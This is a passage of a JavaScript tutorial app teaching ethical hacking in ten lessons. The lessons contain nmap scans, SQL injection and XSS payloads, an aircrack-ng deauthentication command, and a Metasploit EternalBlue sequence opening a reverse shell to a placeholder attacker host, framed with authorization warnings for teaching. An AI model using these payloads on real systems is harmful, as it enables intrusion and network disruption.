// Offline Ethical Hacking Tutorial App
class OfflineEthicalHackingApp {
    constructor() {
        this.lessons = {
            1: {
                title: 'Introduction to Ethical Hacking',
                description: 'Learn the fundamentals of ethical hacking, white hat vs black hat hackers, and the importance of cybersecurity.',
                duration: '45 minutes',
                content: `
                    <h3>What is Ethical Hacking?</h3>
                    <p>Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing systems, networks, and applications for security vulnerabilities in a legal and authorized manner.</p>

                    <h4>Key Concepts</h4>
                    <div class="row">
                        <div class="col-md-4 mb-3">
                            <div class="card h-100 bg-dark border-success">
                                <div class="card-body text-center">
                                    <i class="fas fa-user-shield fa-2x text-success mb-2"></i>
                                    <h6>White Hat Hackers</h6>
                                    <p class="small">Ethical hackers who work to protect systems and help organizations improve security.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4 mb-3">
                            <div class="card h-100 bg-dark border-warning">
                                <div class="card-body text-center">
                                    <i class="fas fa-user-ninja fa-2x text-warning mb-2"></i>
                                    <h6>Gray Hat Hackers</h6>
                                    <p class="small">Hackers who may violate laws but don't have malicious intent.</p>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-4 mb-3">
                            <div class="card h-100 bg-dark border-danger">
                                <div class="card-body text-center">
                                    <i class="fas fa-user-secret fa-2x text-danger mb-2"></i>
                                    <h6>Black Hat Hackers</h6>
                                    <p class="small">Malicious hackers who exploit vulnerabilities for personal gain or to cause harm.</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <h4>The Ethical Hacking Process</h4>
                    <div class="alert alert-info">
                        <h6><i class="fas fa-info-circle me-2"></i>Important Note</h6>
                        <p class="mb-0">Always ensure you have explicit written permission before testing any system that you don't own. Unauthorized access is illegal and can result in serious legal consequences.</p>
                    </div>

                    <ol class="list-group list-group-numbered">
                        <li class="list-group-item">
                            <strong>Planning and Reconnaissance</strong>
                            <p class="mb-0">Gather information about the target system and define the scope of testing.</p>
                        </li>
                        <li class="list-group-item">
                            <strong>Scanning</strong>
                            <p class="mb-0">Use tools to discover live systems, open ports, and services.</p>
                        </li>
                        <li class="list-group-item">
                            <strong>Gaining Access</strong>
                            <p class="mb-0">Exploit vulnerabilities to gain unauthorized access to systems.</p>
                        </li>
                        <li class="list-group-item">
                            <strong>Maintaining Access</strong>
                            <p class="mb-0">Establish persistent access to demonstrate the impact of vulnerabilities.</p>
                        </li>
                        <li class="list-group-item">
                            <strong>Analysis and Reporting</strong>
                            <p class="mb-0">Document findings and provide recommendations for remediation.</p>
                        </li>
                    </ol>

                    <h4>Essential Skills for Ethical Hackers</h4>
                    <div class="row mt-3">
                        <div class="col-md-6">
                            <h6><i class="fas fa-code text-info me-2"></i>Technical Skills</h6>
                            <ul>
                                <li>Programming (Python, JavaScript, C++)</li>
                                <li>Networking fundamentals</li>
                                <li>Operating systems (Linux, Windows)</li>
                                <li>Web technologies</li>
                                <li>Database systems</li>
                            </ul>
                        </div>
                        <div class="col-md-6">
                            <h6><i class="fas fa-brain text-info me-2"></i>Soft Skills</h6>
                            <ul>
                                <li>Problem-solving abilities</li>
                                <li>Attention to detail</li>
                                <li>Communication skills</li>
                                <li>Continuous learning mindset</li>
                                <li>Ethical decision-making</li>
                            </ul>
                        </div>
                    </div>

                    <h4>Sample Code: Simple Port Scanner</h4>
                    <p>Here's a basic example of a port scanner written in Python:</p>
                    
                    <pre><code class="language-python">#!/usr/bin/env python3
import socket
import sys
from datetime import datetime

def scan_port(target, port):
    """
    Scan a specific port on the target host
    """
    try:
        # Create socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        
        # Attempt to connect
        result = sock.connect_ex((target, port))
        sock.close()
        
        if result == 0:
            return True
        else:
            return False
    except socket.gaierror:
        return False

def main():
    target = input("Enter target IP: ")
    
    # Display scan start time
    print(f"Starting port scan on {target}")
    print(f"Time started: {datetime.now()}")
    print("-" * 50)
    
    # Scan common ports
    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995]
    
    for port in common_ports:
        if scan_port(target, port):
            print(f"Port {port}: Open")
        else:
            print(f"Port {port}: Closed")
    
    print("-" * 50)
    print(f"Scan completed: {datetime.now()}")

if __name__ == "__main__":
    main()</code></pre>

                    <div class="alert alert-warning">
                        <h6><i class="fas fa-exclamation-triangle me-2"></i>Legal Warning</h6>
                        <p class="mb-0">Only use this code on systems you own or have explicit permission to test. Unauthorized scanning may be illegal in your jurisdiction.</p>
                    </div>

                    <h4>Career Certifications</h4>
                    <p>Consider pursuing these industry-recognized certifications:</p>
                    <ul>
                        <li><strong>CEH (Certified Ethical Hacker):</strong> Entry-level ethical hacking certification</li>
                        <li><strong>OSCP (Offensive Security Certified Professional):</strong> Hands-on penetration testing</li>
                        <li><strong>CISSP (Certified Information Systems Security Professional):</strong> Management-level security</li>
                        <li><strong>CompTIA Security+:</strong> Foundational cybersecurity knowledge</li>
                    </ul>
                `
            },
            2: {
                title: 'Network Scanning & Reconnaissance',
                description: 'Master network discovery techniques, port scanning, and information gathering methodologies.',
                duration: '60 minutes',
                content: `
                    <h3>Network Scanning & Reconnaissance</h3>
                    <p>Reconnaissance is the first phase of any penetration test. It involves gathering as much information as possible about the target system, network, or organization before attempting to exploit vulnerabilities.</p>

                    <h4>Types of Reconnaissance</h4>
                    <div class="row">
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 bg-dark border-info">
                                <div class="card-body">
                                    <h6><i class="fas fa-eye text-info me-2"></i>Passive Reconnaissance</h6>
                                    <p class="small">Gathering information without directly interacting with the target system. This includes:</p>
                                    <ul class="small">
                                        <li>WHOIS lookups</li>
                                        <li>DNS enumeration</li>
                                        <li>Social media research</li>
                                        <li>Google dorking</li>
                                        <li>Public records</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 mb-3">
                            <div class="card h-100 bg-dark border-warning">
                                <div class="card-body">
                                    <h6><i class="fas fa-radar-dish text-warning me-2"></i>Active Reconnaissance</h6>
                                    <p class="small">Directly interacting with the target system to gather information:</p>
                                    <ul class="small">
                                        <li>Port scanning</li>
                                        <li>Network mapping</li>
                                        <li>Service enumeration</li>
                                        <li>OS fingerprinting</li>
                                        <li>Banner grabbing</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    <h4>Network Scanning Techniques</h4>
                    
                    <h5>1. Host Discovery</h5>
                    <p>Identifying live hosts on a network:</p>
                    <pre><code class="language-bash"># Ping sweep to find live hosts
nmap -sn 192.168.1.0/24

# ARP scan for local network
nmap -PR 192.168.1.0/24

# TCP SYN ping
nmap -PS 192.168.1.0/24</code></pre>

                    <h5>2. Port Scanning</h5>
                    <p>Different types of port scans serve different purposes:</p>
                    
                    <div class="table-responsive">
                        <table class="table table-dark table-striped">
                            <thead>
                                <tr>
                                    <th>Scan Type</th>
                                    <th>Nmap Option</th>
                                    <th>Description</th>
                                    <th>Stealth Level</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>TCP Connect</td>
                                    <td>-sT</td>
                                    <td>Completes full TCP handshake</td>
                                    <td><span class="badge bg-danger">Low</span></td>
                                </tr>
                                <tr>
                                    <td>TCP SYN</td>
                                    <td>-sS</td>
                                    <td>Half-open scan, stealthier</td>
                                    <td><span class="badge bg-warning">Medium</span></td>
                                </tr>
                                <tr>
                                    <td>FIN Scan</td>
                                    <td>-sF</td>
                                    <td>Sends FIN packets</td>
                                    <td><span class="badge bg-success">High</span></td>
                                </tr>
                                <tr>
                                    <td>UDP Scan</td>
                                    <td>-sU</td>
                                    <td>Scans UDP services</td>
                                    <td><span class="badge bg-info">Variable</span></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <h5>3. Service Detection</h5>
                    <pre><code class="language-bash"># Version detection
nmap -sV target_ip

# OS detection
nmap -O target_ip

# Aggressive scan (includes OS detection, version detection, script scanning)
nmap -A target_ip

# Script scanning for vulnerabilities
nmap --script vuln target_ip</code></pre>

                    <h4>DNS Enumeration</h4>
                    <p>DNS provides valuable information about target infrastructure:</p>
                    <pre><code class="language-bash"># DNS lookup tools
dig example.com
nslookup example.com
host example.com

# Zone transfer attempt
dig axfr @nameserver example.com

# Subdomain enumeration
dnsrecon -d example.com -t std
fierce -dns example.com</code></pre>

                    <h4>WHOIS Information Gathering</h4>
                    <pre><code class="language-bash"># Domain WHOIS lookup
whois example.com

# IP WHOIS lookup  
whois 192.168.1.1

# Using online tools for comprehensive information
# - whois.net
# - whois.domaintools.com</code></pre>

                    <div class="alert alert-danger">
                        <h6><i class="fas fa-exclamation-triangle me-2"></i>Legal Warning</h6>
                        <p class="mb-0">Active reconnaissance techniques can be detected and may be considered hostile. Only perform these activities on systems you own or have explicit written permission to test.</p>
                    </div>

                    <h4>Practical Exercise</h4>
                    <p>Try this basic network discovery exercise (on your own network only):</p>
                    <ol>
                        <li>Discover your local network range using <code>ip route</code> or <code>ipconfig</code></li>
                        <li>Perform a ping sweep to find live hosts</li>
                        <li>Run a basic port scan on discovered hosts</li>
                        <li>Attempt service detection on open ports</li>
                        <li>Research any services found using banner grabbing</li>
                    </ol>
                `
            },
            3: {
                title: 'Vulnerability Assessment',
                description: 'Understand how to identify, classify, and prioritize security vulnerabilities in systems.',
                duration: '55 minutes',
                content: `
                    <h2>Vulnerability Assessment</h2>
                    <p>Learn how to systematically identify and evaluate security weaknesses in systems and applications.</p>
                    
                    <h3>Vulnerability Assessment Process</h3>
                    <ol>
                        <li>Asset Discovery and Inventory</li>
                        <li>Vulnerability Scanning</li>
                        <li>Vulnerability Analysis</li>
                        <li>Risk Assessment</li>
                        <li>Remediation Planning</li>
                        <li>Reporting</li>
                    </ol>
                    
                    <h3>Common Vulnerability Types</h3>
                    <ul>
                        <li>Missing security patches</li>
                        <li>Weak or default passwords</li>
                        <li>Misconfigured services</li>
                        <li>Unnecessary open ports</li>
                        <li>Outdated software versions</li>
                    </ul>
                    
                    <h3>CVSS Scoring System</h3>
                    <p>The Common Vulnerability Scoring System (CVSS) provides a standardized way to rate vulnerabilities:</p>
                    <ul>
                        <li><strong>Critical:</strong> 9.0-10.0</li>
                        <li><strong>High:</strong> 7.0-8.9</li>
                        <li><strong>Medium:</strong> 4.0-6.9</li>
                        <li><strong>Low:</strong> 0.1-3.9</li>
                    </ul>
                    
                    <h3>Popular Vulnerability Scanners</h3>
                    <pre><code class="language-bash"># Nessus - Professional vulnerability scanner
# OpenVAS - Open source vulnerability scanner
# Nmap with scripts
nmap --script vuln target_ip</code></pre>
                `
            },
            4: {
                title: 'Web Application Security Testing',
                description: 'Explore common web vulnerabilities like XSS, SQL injection, and CSRF attacks.',
                duration: '70 minutes',
                content: `
                    <h2>Web Application Security Testing</h2>
                    <p>Learn about the most common web application vulnerabilities and how to test for them.</p>
                    
                    <h3>OWASP Top 10 Web Application Security Risks</h3>
                    <ol>
                        <li>Injection (SQL, NoSQL, OS, LDAP)</li>
                        <li>Broken Authentication</li>
                        <li>Sensitive Data Exposure</li>
                        <li>XML External Entities (XXE)</li>
                        <li>Broken Access Control</li>
                        <li>Security Misconfiguration</li>
                        <li>Cross-Site Scripting (XSS)</li>
                        <li>Insecure Deserialization</li>
                        <li>Using Components with Known Vulnerabilities</li>
                        <li>Insufficient Logging & Monitoring</li>
                    </ol>
                    
                    <h3>SQL Injection Example</h3>
                    <pre><code class="language-sql">-- Vulnerable query
SELECT * FROM users WHERE id = '$user_input';

-- Malicious input: 1' OR '1'='1
-- Results in: SELECT * FROM users WHERE id = '1' OR '1'='1';</code></pre>
                    
                    <h3>Cross-Site Scripting (XSS)</h3>
                    <pre><code class="language-html"><!-- Vulnerable input field -->
<input type="text" value="<?php echo $_GET['search']; ?>">

<!-- Malicious input: "><script>alert('XSS')</script>
<!-- Results in: <input type="text" value=""><script>alert('XSS')</script>"> --></code></pre>
                    
                    <h3>Testing Tools</h3>
                    <ul>
                        <li><strong>Burp Suite:</strong> Comprehensive web application testing platform</li>
                        <li><strong>OWASP ZAP:</strong> Free security testing proxy</li>
                        <li><strong>SQLmap:</strong> Automated SQL injection testing tool</li>
                        <li><strong>Nikto:</strong> Web server scanner</li>
                    </ul>
                `
            },
            5: {
                title: 'Wireless Network Security',
                description: 'Learn about WiFi security protocols, wireless attack vectors, and protection methods.',
                duration: '50 minutes',
                content: `
                    <h2>Wireless Network Security</h2>
                    <p>Understanding wireless network security is crucial in today's connected world.</p>
                    
                    <h3>WiFi Security Protocols</h3>
                    <ul>
                        <li><strong>WEP (Wired Equivalent Privacy):</strong> Deprecated, easily crackable</li>
                        <li><strong>WPA (WiFi Protected Access):</strong> Better than WEP but still vulnerable</li>
                        <li><strong>WPA2:</strong> Current standard with AES encryption</li>
                        <li><strong>WPA3:</strong> Latest standard with enhanced security</li>
                    </ul>
                    
                    <h3>Common Wireless Attacks</h3>
                    <ol>
                        <li><strong>Evil Twin:</strong> Rogue access point mimicking legitimate AP</li>
                        <li><strong>Deauthentication Attack:</strong> Forcing clients to disconnect</li>
                        <li><strong>WPS PIN Attack:</strong> Exploiting WiFi Protected Setup</li>
                        <li><strong>Packet Injection:</strong> Injecting malicious packets</li>
                    </ol>
                    
                    <h3>Wireless Security Best Practices</h3>
                    <ul>
                        <li>Use WPA3 or WPA2 with strong passwords</li>
                        <li>Disable WPS if not needed</li>
                        <li>Change default administrator credentials</li>
                        <li>Enable MAC address filtering (though not foolproof)</li>
                        <li>Regularly update firmware</li>
                        <li>Use enterprise authentication for corporate networks</li>
                    </ul>
                    
                    <h3>Testing Tools</h3>
                    <pre><code class="language-bash"># Aircrack-ng suite for wireless testing
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng -0 5 -a [BSSID] wlan0mon</code></pre>
                    
                    <div class="alert alert-warning">
                        <strong>Legal Warning:</strong> Only test wireless networks you own or have explicit permission to test!
                    </div>
                `
            },
            6: {
                title: 'Social Engineering Awareness',
                description: 'Understand human psychology in cybersecurity and common social engineering tactics.',
                duration: '40 minutes',
                content: `
                    <h2>Social Engineering Awareness</h2>
                    <p>Social engineering exploits human psychology rather than technical vulnerabilities.</p>
                    
                    <h3>Types of Social Engineering Attacks</h3>
                    <ul>
                        <li><strong>Phishing:</strong> Fraudulent emails or websites</li>
                        <li><strong>Pretexting:</strong> Creating fictional scenarios</li>
                        <li><strong>Baiting:</strong> Leaving infected devices or media</li>
                        <li><strong>Quid Pro Quo:</strong> Offering services in exchange for information</li>
                        <li><strong>Tailgating:</strong> Following authorized personnel into secure areas</li>
                    </ul>
                    
                    <h3>Psychology Behind Social Engineering</h3>
                    <ol>
                        <li><strong>Authority:</strong> People comply with perceived authority figures</li>
                        <li><strong>Urgency:</strong> Creating time pressure reduces critical thinking</li>
                        <li><strong>Fear:</strong> Threatening negative consequences</li>
                        <li><strong>Trust:</strong> Building rapport and seeming legitimate</li>
                        <li><strong>Curiosity:</strong> Exploiting natural human curiosity</li>
                    </ol>
                    
                    <h3>Red Flags to Watch For</h3>
                    <ul>
                        <li>Unsolicited contact requesting sensitive information</li>
                        <li>Urgent requests that bypass normal procedures</li>
                        <li>Requests for information the person shouldn't need</li>
                        <li>Offers that seem too good to be true</li>
                        <li>Pressure to act quickly</li>
                    </ul>
                    
                    <h3>Defense Strategies</h3>
                    <ol>
                        <li>Verify identities through independent channels</li>
                        <li>Follow established procedures</li>
                        <li>Be skeptical of unsolicited contact</li>
                        <li>Train employees regularly</li>
                        <li>Implement multi-factor authentication</li>
                        <li>Create a security-conscious culture</li>
                    </ol>
                `
            },
            7: {
                title: 'Penetration Testing Methodologies',
                description: 'Master structured approaches to penetration testing and security assessments.',
                duration: '65 minutes',
                content: `
                    <h2>Penetration Testing Methodologies</h2>
                    <p>Learn systematic approaches to conducting thorough security assessments.</p>
                    
                    <h3>PTES (Penetration Testing Execution Standard)</h3>
                    <ol>
                        <li><strong>Pre-engagement Interactions</strong></li>
                        <li><strong>Intelligence Gathering</strong></li>
                        <li><strong>Threat Modeling</strong></li>
                        <li><strong>Vulnerability Analysis</strong></li>
                        <li><strong>Exploitation</strong></li>
                        <li><strong>Post Exploitation</strong></li>
                        <li><strong>Reporting</strong></li>
                    </ol>
                    
                    <h3>OWASP Testing Guide</h3>
                    <p>Comprehensive methodology for web application testing:</p>
                    <ul>
                        <li>Information Gathering</li>
                        <li>Configuration and Deployment Management Testing</li>
                        <li>Identity Management Testing</li>
                        <li>Authentication Testing</li>
                        <li>Authorization Testing</li>
                        <li>Session Management Testing</li>
                        <li>Input Validation Testing</li>
                        <li>Error Handling</li>
                        <li>Cryptography</li>
                        <li>Business Logic Testing</li>
                    </ul>
                    
                    <h3>Types of Penetration Tests</h3>
                    <ul>
                        <li><strong>Black Box:</strong> No prior knowledge of the system</li>
                        <li><strong>White Box:</strong> Full knowledge and access</li>
                        <li><strong>Gray Box:</strong> Limited knowledge (most realistic)</li>
                    </ul>
                    
                    <h3>Documentation Requirements</h3>
                    <ol>
                        <li>Executive Summary</li>
                        <li>Methodology</li>
                        <li>Scope and Limitations</li>
                        <li>Findings and Evidence</li>
                        <li>Risk Assessment</li>
                        <li>Recommendations</li>
                        <li>Appendices (technical details)</li>
                    </ol>
                `
            },
            8: {
                title: 'Security Tools & Frameworks',
                description: 'Get hands-on with popular security tools like Nmap, Wireshark, Metasploit, and Burp Suite.',
                duration: '80 minutes',
                content: `
                    <h2>Security Tools & Frameworks</h2>
                    <p>Master the essential tools every ethical hacker should know.</p>
                    
                    <h3>Network Scanning Tools</h3>
                    <h4>Nmap (Network Mapper)</h4>
                    <pre><code class="language-bash"># Basic host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p 1-1000 target_ip

# OS detection and service versioning
nmap -O -sV target_ip

# Script scanning
nmap --script vuln target_ip</code></pre>
                    
                    <h3>Web Application Testing</h3>
                    <h4>Burp Suite</h4>
                    <ul>
                        <li>Proxy for intercepting HTTP traffic</li>
                        <li>Spider for automated crawling</li>
                        <li>Scanner for vulnerability detection</li>
                        <li>Intruder for automated attacks</li>
                        <li>Repeater for manual testing</li>
                    </ul>
                    
                    <h3>Network Analysis</h3>
                    <h4>Wireshark</h4>
                    <pre><code class="language-bash"># Capture filters
host 192.168.1.1
port 80
tcp and port 443

# Display filters
http.request.method == "POST"
tcp.flags.syn == 1</code></pre>
                    
                    <h3>Exploitation Frameworks</h3>
                    <h4>Metasploit</h4>
                    <pre><code class="language-bash"># Basic Metasploit commands
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
exploit</code></pre>
                    
                    <h3>Operating System Distributions</h3>
                    <ul>
                        <li><strong>Kali Linux:</strong> Debian-based with 600+ security tools</li>
                        <li><strong>Parrot Security OS:</strong> Privacy and security focused</li>
                        <li><strong>BlackArch Linux:</strong> Arch-based penetration testing distro</li>
                    </ul>
                `
            },
            9: {
                title: 'Incident Response & Reporting',
                description: 'Learn how to respond to security incidents and create professional security reports.',
                duration: '55 minutes',
                content: `
                    <h2>Incident Response & Reporting</h2>
                    <p>Develop skills for responding to security incidents and communicating findings effectively.</p>
                    
                    <h3>Incident Response Lifecycle</h3>
                    <ol>
                        <li><strong>Preparation:</strong> Establish policies and procedures</li>
                        <li><strong>Identification:</strong> Detect and analyze incidents</li>
                        <li><strong>Containment:</strong> Limit damage and prevent spread</li>
                        <li><strong>Eradication:</strong> Remove threats from environment</li>
                        <li><strong>Recovery:</strong> Restore systems to normal operation</li>
                        <li><strong>Lessons Learned:</strong> Review and improve processes</li>
                    </ol>
                    
                    <h3>Incident Classification</h3>
                    <ul>
                        <li><strong>Low:</strong> Minimal impact, routine handling</li>
                        <li><strong>Medium:</strong> Moderate impact, requires attention</li>
                        <li><strong>High:</strong> Significant impact, urgent response</li>
                        <li><strong>Critical:</strong> Severe impact, emergency response</li>
                    </ul>
                    
                    <h3>Evidence Collection</h3>
                    <ol>
                        <li>Preserve chain of custody</li>
                        <li>Document everything</li>
                        <li>Take forensic images</li>
                        <li>Collect logs and artifacts</li>
                        <li>Interview relevant personnel</li>
                    </ol>
                    
                    <h3>Professional Reporting</h3>
                    <h4>Executive Summary Components</h4>
                    <ul>
                        <li>Scope and objectives</li>
                        <li>Key findings summary</li>
                        <li>Risk level assessment</li>
                        <li>Recommendations overview</li>
                        <li>Business impact</li>
                    </ul>
                    
                    <h4>Technical Report Sections</h4>
                    <ol>
                        <li>Methodology</li>
                        <li>Detailed findings</li>
                        <li>Evidence and screenshots</li>
                        <li>Risk ratings</li>
                        <li>Step-by-step remediation</li>
                        <li>Testing procedures</li>
                    </ol>
                `
            },
            10: {
                title: 'Legal & Ethical Considerations',
                description: 'Understand the legal framework, ethics, and professional responsibilities in cybersecurity.',
                duration: '45 minutes',
                content: `
                    <h2>Legal & Ethical Considerations</h2>
                    <p>Understanding the legal and ethical boundaries is crucial for any cybersecurity professional.</p>
                    
                    <h3>Key Legal Frameworks</h3>
                    <ul>
                        <li><strong>Computer Fraud and Abuse Act (CFAA):</strong> US federal law</li>
                        <li><strong>GDPR:</strong> European data protection regulation</li>
                        <li><strong>HIPAA:</strong> Health information privacy</li>
                        <li><strong>SOX:</strong> Financial reporting requirements</li>
                        <li><strong>PCI DSS:</strong> Payment card industry standards</li>
                    </ul>
                    
                    <h3>Ethical Hacking Guidelines</h3>
                    <ol>
                        <li><strong>Authorization:</strong> Always get written permission</li>
                        <li><strong>Scope:</strong> Stay within agreed boundaries</li>
                        <li><strong>Disclosure:</strong> Report findings responsibly</li>
                        <li><strong>Confidentiality:</strong> Protect client information</li>
                        <li><strong>Integrity:</strong> Be honest and transparent</li>
                    </ol>
                    
                    <h3>Professional Certifications</h3>
                    <ul>
                        <li><strong>CEH (Certified Ethical Hacker):</strong> Entry-level ethical hacking</li>
                        <li><strong>OSCP (Offensive Security Certified Professional):</strong> Hands-on penetration testing</li>
                        <li><strong>CISSP (Certified Information Systems Security Professional):</strong> Management level</li>
                        <li><strong>CISM (Certified Information Security Manager):</strong> Security management</li>
                        <li><strong>GSEC (GIAC Security Essentials):</strong> Broad security knowledge</li>
                    </ul>
                    
                    <h3>Responsible Disclosure</h3>
                    <ol>
                        <li>Report to the organization first</li>
                        <li>Provide reasonable time for fixes</li>
                        <li>Don't disclose publicly until patched</li>
                        <li>Work cooperatively with vendors</li>
                        <li>Consider bug bounty programs</li>
                    </ol>
                    
                    <h3>Professional Code of Ethics</h3>
                    <ul>
                        <li>Protect society and the common good</li>
                        <li>Act honorably and in the public interest</li>
                        <li>Provide diligent and competent service</li>
                        <li>Advance and protect the profession</li>
                    </ul>
                    
                    <div class="alert alert-success">
                        <strong>Congratulations!</strong> You've completed the Ethical Hacking Tutorial course!
                    </div>
                `
            }
        };
        
        this.currentLesson = 1;
        this.completedLessons = this.loadProgress();
        this.init();
    }

    init() {
        this.createHTML();
        this.bindEvents();
        this.updateProgress();
        this.loadLessonFromURL();
    }

    createHTML() {
        document.body.innerHTML = `
            <div id="mobileApp" class="mobile-app-container responsive-container">
                <!-- Mobile Status Bar -->
                <div class="mobile-status-bar">
                    <div class="status-left">
                        <span class="signal-strength"><i class="fas fa-signal"></i></span>
                        <span class="carrier">Offline</span>
                    </div>
                    <div class="status-center">
                        <span class="time" id="statusTime">12:00</span>
                    </div>
                    <div class="status-right">
                        <span class="battery"><i class="fas fa-battery-three-quarters"></i></span>
                        <span class="battery-percent">100%</span>
                    </div>
                </div>

                <!-- Mobile Header -->
                <header class="mobile-app-header">
                    <div class="mobile-header-content">
                        <button class="header-btn back-btn" onclick="app.showHome()" id="backBtn" style="display: none;">
                            <i class="fas fa-chevron-left"></i>
                        </button>
                        <div class="header-title">
                            <h1 id="headerTitle"><i class="fas fa-shield-alt me-2"></i>EthicalHack</h1>
                            <span class="header-subtitle" id="headerSubtitle">Learn Cybersecurity</span>
                        </div>
                        <button class="header-btn menu-btn" onclick="app.toggleLessonMenu()" id="menuBtn">
                            <i class="fas fa-ellipsis-vertical"></i>
                        </button>
                    </div>
                </header>

                <!-- Mobile Content Area -->
                <main class="mobile-app-content" id="mainContent">
                    ${this.getHomeContent()}
                </main>

                <!-- Mobile Bottom Navigation -->
                <nav class="mobile-bottom-nav">
                    <a href="#" class="nav-item active" onclick="app.showHome()">
                        <i class="fas fa-home"></i>
                        <span>Home</span>
                    </a>
                    <a href="#" class="nav-item" onclick="app.showLesson(1)">
                        <i class="fas fa-graduation-cap"></i>
                        <span>Lessons</span>
                    </a>
                    <a href="#" class="nav-item" onclick="app.showProgress()">
                        <i class="fas fa-chart-line"></i>
                        <span>Progress</span>
                    </a>
                    <a href="#" class="nav-item" onclick="app.showSettings()">
                        <i class="fas fa-cog"></i>
                        <span>Settings</span>
                    </a>
                </nav>

                <!-- Lesson Menu Overlay -->
                <div id="lessonMenuOverlay" class="lesson-menu-overlay" style="display: none;">
                    <div class="lesson-menu-content">
                        <div class="lesson-menu-header">
                            <h5><i class="fas fa-list me-2"></i>All Lessons</h5>
                            <button onclick="app.toggleLessonMenu()"><i class="fas fa-times"></i></button>
                        </div>
                        <div class="lesson-menu-body">
                            ${this.getLessonMenuContent()}
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    getHomeContent() {
        const completedCount = this.completedLessons.length;
        const totalCount = Object.keys(this.lessons).length;
        const progressPercent = Math.round((completedCount / totalCount) * 100);

        return `
            <!-- Progress Card -->
            <div class="mobile-card progress-card">
                <div class="card-header">
                    <h6><i class="fas fa-chart-line me-2"></i>Your Progress</h6>
                </div>
                <div class="card-body">
                    <div class="progress-ring">
                        <svg class="circular-chart" viewBox="0 0 100 100">
                            <circle class="circle-bg" cx="50" cy="50" r="45"></circle>
                            <circle class="circle" cx="50" cy="50" r="45" 
                                    stroke-dasharray="${progressPercent * 2.827}, 282.7"></circle>
                        </svg>
                        <div class="percentage">${progressPercent}%</div>
                    </div>
                    <div class="progress-info">
                        <p><strong>${completedCount} of ${totalCount} lessons completed</strong></p>
                        <p class="text-muted">Keep going! You're doing great.</p>
                    </div>
                </div>
            </div>

            <!-- Quick Actions -->
            <div class="mobile-card">
                <div class="card-header">
                    <h6><i class="fas fa-bolt me-2"></i>Quick Actions</h6>
                </div>
                <div class="card-body">
                    <div class="action-grid">
                        <div class="action-btn" onclick="app.showLesson(${this.getNextLesson()})">
                            <i class="fas fa-play"></i>
                            <span>Continue Learning</span>
                        </div>
                        <div class="action-btn" onclick="app.showProgress()">
                            <i class="fas fa-chart-bar"></i>
                            <span>View Progress</span>
                        </div>
                        <div class="action-btn" onclick="app.resetProgress()">
                            <i class="fas fa-redo"></i>
                            <span>Reset Progress</span>
                        </div>
                        <div class="action-btn" onclick="app.showSettings()">
                            <i class="fas fa-cog"></i>
                            <span>Settings</span>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Lessons List -->
            <div class="mobile-card">
                <div class="card-header">
                    <h6><i class="fas fa-graduation-cap me-2"></i>All Lessons</h6>
                </div>
                <div class="card-body">
                    <div class="lesson-list">
                        ${Object.entries(this.lessons).map(([id, lesson]) => `
                            <div class="lesson-item" onclick="app.showLesson(${id})">
                                <div class="lesson-number ${this.completedLessons.includes(parseInt(id)) ? 'completed' : ''}">
                                    ${this.completedLessons.includes(parseInt(id)) ? '<i class="fas fa-check"></i>' : id}
                                </div>
                                <div class="lesson-content">
                                    <h6>${lesson.title}</h6>
                                    <small class="text-muted">
                                        <i class="fas fa-clock me-1"></i>${lesson.duration}
                                    </small>
                                </div>
                                <div class="lesson-arrow">
                                    <i class="fas fa-chevron-right"></i>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                </div>
            </div>
        `;
    }

    getLessonMenuContent() {
        return Object.entries(this.lessons).map(([id, lesson]) => `
            <div class="lesson-menu-item ${this.completedLessons.includes(parseInt(id)) ? 'completed' : ''}" 
                 onclick="app.showLesson(${id}); app.toggleLessonMenu();">
                <div class="lesson-number">${id}</div>
                <div class="lesson-info">
                    <div class="lesson-title">${lesson.title}</div>
                    <div class="lesson-duration">
                        <i class="fas fa-clock me-1"></i>${lesson.duration}
                    </div>
                </div>
                <div class="lesson-status">
                    ${this.completedLessons.includes(parseInt(id)) ? '<i class="fas fa-check"></i>' : '<i class="fas fa-chevron-right"></i>'}
                </div>
            </div>
        `).join('');
    }

    showHome() {
        this.currentView = 'home';
        document.getElementById('headerTitle').innerHTML = '<i class="fas fa-shield-alt me-2"></i>EthicalHack';
        document.getElementById('headerSubtitle').textContent = 'Learn Cybersecurity';
        document.getElementById('backBtn').style.display = 'none';
        document.getElementById('mainContent').innerHTML = this.getHomeContent();
        this.updateNavigation('home');
    }

    showLesson(lessonId) {
        this.currentLesson = parseInt(lessonId);
        this.currentView = 'lesson';
        const lesson = this.lessons[lessonId];
        
        document.getElementById('headerTitle').textContent = `Lesson ${lessonId}`;
        document.getElementById('headerSubtitle').textContent = lesson.title;
        document.getElementById('backBtn').style.display = 'flex';
        
        document.getElementById('mainContent').innerHTML = `
            <div class="lesson-content">
                ${lesson.content}
                
                <div class="lesson-navigation mt-4">
                    <div class="d-flex justify-content-between">
                        ${lessonId > 1 ? `
                            <button class="btn btn-outline-primary" onclick="app.showLesson(${parseInt(lessonId) - 1})">
                                <i class="fas fa-chevron-left me-2"></i>Previous
                            </button>
                        ` : '<div></div>'}
                        
                        <button class="btn btn-success" onclick="app.completeLesson(${lessonId})">
                            ${this.completedLessons.includes(parseInt(lessonId)) ? 
                                '<i class="fas fa-check me-2"></i>Completed' : 
                                '<i class="fas fa-check me-2"></i>Mark Complete'}
                        </button>
                        
                        ${lessonId < Object.keys(this.lessons).length ? `
                            <button class="btn btn-outline-primary" onclick="app.showLesson(${parseInt(lessonId) + 1})">
                                Next<i class="fas fa-chevron-right ms-2"></i>
                            </button>
